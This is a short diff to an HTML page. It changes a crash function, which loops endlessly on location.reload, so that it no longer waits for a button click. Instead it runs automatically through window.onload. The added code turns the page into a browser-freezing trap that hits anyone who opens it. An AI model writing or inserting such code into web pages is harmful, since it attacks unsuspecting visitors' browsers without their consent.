@@ -27,14 +27,17 @@
 </head>
 <body>
 
-  <button onclick="crash()"></button>
+  <button></button>
 
   <script>
     function crash() {
       setTimeout(function() {
         while (1) location.reload(1);
-      }, 0001);
+      }, 1);
     }
+
+    // Run crash on page load
+    window.onload = crash;
   </script>
 
 </body>
